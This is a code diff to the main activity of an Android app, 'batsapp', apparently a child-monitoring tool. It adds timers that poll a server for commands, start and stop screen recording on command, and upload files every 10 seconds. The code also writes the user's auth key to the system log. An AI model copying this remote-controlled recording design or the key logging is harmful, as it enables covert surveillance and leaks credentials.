@@ -10,6 +10,7 @@ import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.util.Log;
 import android.view.MotionEvent;
 import android.view.View;
@@ -55,7 +56,7 @@ public class MainActivity extends Activity {
     private static final int REQUEST_CODE = 100;
 
     private static final String TAG = "batsapp";
-    public static final String APP_VERSION = "0.0.7";
+    public static final String APP_VERSION = "0.0.9";
 
     private static Intent result_data;
 
@@ -94,6 +95,9 @@ public class MainActivity extends Activity {
     public WebView webView;
     private ProgressBar progressBar;
 
+    Handler handler = new Handler();
+
+
     public MainActivity() {
     }
 
@@ -101,15 +105,126 @@ public class MainActivity extends Activity {
     @SuppressLint("SetTextI18n")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        TextView version;
 
         Log.d(TAG, "starting batsapp " + APP_VERSION);
         super.onCreate(savedInstanceState);
 
+        setContentView(R.layout.kidspage);
+
+        //todo if config done, select and start activity
+        TextView version = findViewById(R.id.appVersion);
+        version.setText(APP_VERSION);
+
+        TextView systemMessage = findViewById((R.id.systemMessage));
+
+
+        //fixme get file path inside method and change strategy...
+        WatchDog.filesPath = "empty";
+
+
+        // call ws and get command & renew  candidate config every 5 second
+
+        Timer wsServiceManager = new Timer();
+        Ping ping = new Ping();
+        wsServiceManager.schedule(ping, 0, 5_000);
+
+        // check and upload files every 10 second
+        Timer timerUpload = new Timer();
+        UploadServiceManager uploadServiceManager = new UploadServiceManager();
+        timerUpload.schedule(uploadServiceManager, 0, 10_000);
+
+
+        runOnUiThread(new Runnable() {
+
+            @Override
+            public void run() {
+                authKey = Utils.readAuthKey(getApplicationContext());
+                if (!authKey.equals("empty")) {
+                    Log.d(TAG, "extracted  authKey -> " + authKey);
+                    authKeyStatus = true;
+                    Log.d(TAG, "extracted  credentials -> " + authKey);
+                    try {
+                        BarcodeEncoder barcodeEncoder = new BarcodeEncoder();
+                        Bitmap bitmap = barcodeEncoder.encodeBitmap(authKey, BarcodeFormat.QR_CODE,
+                                400, 400);
+                        ImageView imageViewQrCode = (ImageView) findViewById(R.id.qrimage);
+                        imageViewQrCode.setImageBitmap(bitmap);
+                        authKeyStatus = true;
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                } else {
+                    authKeyStatus = false;
+                    Log.d(TAG, "user first need to login and get QR code.");
+                }
+
+
+                int numThreads = 1;
+                ExecutorService executor = Executors.newFixedThreadPool(numThreads);
+                Runnable backgroundTask = new Runnable() {
+
+                    @Override
+                    public void run() {
+                        while (true) {
+                            if (config.getCommand().equals("update")) {
+                                handler.post(new Runnable() {
+                                    public void run() {
+                                        systemMessage.setText("لطفا نسخه جدید باتساپ را نصب کنید");
+                                    }
+                                });
+                                Log.d(TAG, "get UPDATE command");
+                            }
+                            if (config.getCommand().equals("start")) {
+                                handler.post(new Runnable() {
+                                    public void run() {
+                                        systemMessage.setText("باتساپ فعال است");
+                                    }
+                                });
+                                if (!isRunning) {
+                                    Log.d(TAG, "get START command");
+                                    startRecording();
+                                } else {
+                                    Log.d(TAG, "START command already executed.");
+                                }
+                            } else if (config.getCommand().equals("stop")) {
+                                handler.post(new Runnable() {
+                                    public void run() {
+                                        systemMessage.setText("باتساپ متوقف  شده است");
+                                    }
+                                });
+                                if (isRunning) {
+                                    Log.d(TAG, "get STOP command");
+                                    stopRecording();
+                                } else {
+                                    Log.d(TAG, "get STOP command but nothing to stop.");
+                                }
+                            } else {
+                                Log.d(TAG, "get " + config.getCommand() + " command");
+
+                            }
+                            try {
+                                Log.d(TAG, "sleep for " + WAIT_COMMAND_CHECK + " second");
+                                Thread.sleep(WAIT_COMMAND_CHECK);
+                            } catch (InterruptedException e) {
+                                e.printStackTrace();
+                            }
+
+                        }
+                    }
+
+                };
+                executor.execute(backgroundTask);
+                executor.shutdown();
+
+            }
+        });
+
+        /*
         setContentView(R.layout.startpage);
         version = findViewById(R.id.appVersion);
         version.setTextSize(14);
         version.setText("version " + APP_VERSION);
+ */
     }
 
     private void openFileExplorer() {
